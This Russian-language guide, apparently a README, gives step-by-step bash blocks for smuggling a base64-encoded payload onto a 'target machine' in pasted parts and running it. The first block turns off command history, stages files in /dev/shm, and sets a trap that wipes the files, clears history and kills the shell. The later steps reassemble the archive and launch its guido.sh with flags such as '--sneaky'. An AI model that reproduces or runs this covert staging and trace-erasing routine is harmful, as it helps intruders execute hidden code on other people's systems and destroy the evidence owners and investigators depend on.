# Инструкция по запуску на целевой машине

## Этап 1: Подготовка среды (выполняется **один раз**)

Скопируйте **ВЕСЬ** блок кода ниже и вставьте его в терминал целевой машины одним действием, затем нажмите Enter.

```bash
# --- НАЧАЛО БЛОКА ДЛЯ ЕДИНОРАЗОВОГО КОПИРОВАНИЯ ---

set -e
# --- Управление историей команд ---
_OLD_HISTCONTROL=${HISTCONTROL:-}
_OLD_HISTFILE=${HISTFILE:-}
export HISTCONTROL=ignoreboth
unset HISTFILE

# --- Создание временного окружения ---
_GUIDO_SESSION_DIR=$(mktemp -d --tmpdir=/dev/shm guido_bootstrap.XXXXXX 2>/dev/null || mktemp -d /tmp/guido_bootstrap.XXXXXX)
_GUIDO_ASSEMBLY_FILE="${_GUIDO_SESSION_DIR}/payload.b64"
touch "$_GUIDO_ASSEMBLY_FILE"

# --- Функция полной очистки ---
_guido_cleanup() {
  echo -e "\n\n[ОЧИСТКА] Произвожу полную очистку следов..."
  rm -rf "$_GUIDO_SESSION_DIR"
  unset _GUIDO_SESSION_DIR _GUIDO_ASSEMBLY_FILE
  export HISTCONTROL="$_OLD_HISTCONTROL"
  export HISTFILE="$_OLD_HISTFILE"
  unset _OLD_HISTCONTROL _OLD_HISTFILE
  unset -f guido_run _guido_cleanup
  history -c
  echo "[ОЧИСТКА] Все следы удалены. Принудительно завершаю сессию."
  kill -9 $$
}

# --- Установка "ловушки" (trap) ---
trap _guido_cleanup EXIT INT TERM

# --- Функция для запуска и активации очистки ---
# Распаковывает архив и запускает guido.sh из него
guido_run() {
    echo "[ЗАПУСК] Запускаю полезную нагрузку..."
    local EXEC_DIR
    EXEC_DIR=$(mktemp -d --tmpdir=/dev/shm guido_exec.XXXXXX 2>/dev/null || mktemp -d /tmp/guido_exec.XXXXXX)
    
    base64 -d "$_GUIDO_ASSEMBLY_FILE" | xz -d | tar -xf - -C "$EXEC_DIR"
    
    touch "${EXEC_DIR}/.guido_payload_marker"

    if [ -f "${EXEC_DIR}/guido.sh" ]; then
        bash "${EXEC_DIR}/guido.sh" "$@"
    else
        echo "[CRITICAL ERROR] Основной файл 'guido.sh' не найден после распаковки!"
    fi
    
    rm -rf "$EXEC_DIR"
}
set +e

clear
echo "=================================================================="
echo "Среда подготовлена. Функция 'guido_run' создана."
echo "Теперь используйте готовые блоки из ЭТАПА 2 для добавления частей."
echo "=================================================================="
# --- КОНЕЦ БЛОКА ДЛЯ ЕДИНОРАЗОВОГО КОПИРОВАНИЯ ---
```

## Этап 2: Передача частей

Для каждой части скопируйте соответствующий блок кода, замените плейсхолдер `{{...}}` на содержимое файла-части и выполните в терминале.

**<<< Для Части 1 >>>**
```bash
cat <<'END_OF_GUIDO' >> "$_GUIDO_ASSEMBLY_FILE"
{{PASTE_PART_1_CONTENT_HERE}}
END_OF_GUIDO
```

**<<< Для Части 2 >>>**
```bash
cat <<'END_OF_GUIDO' >> "$_GUIDO_ASSEMBLY_FILE"
{{PASTE_PART_2_CONTENT_HERE}}
END_OF_GUIDO
```

*(Если есть еще части, просто скопируйте шаблон выше и измените плейсхолдер, например, на `{{PASTE_PART_3_CONTENT_HERE}}`)*

## Этап 3: Запуск и самоуничтожение

После того как **ВСЕ** части были переданы, выполните команду `guido_run`.

**Вариант А: Запуск без аргументов**
```bash
 guido_run
```

**Вариант Б: Запуск с передачей аргументов в ваш скрипт** (например, `--sneaky --pretty`)
```bash
 guido_run --sneaky --pretty
```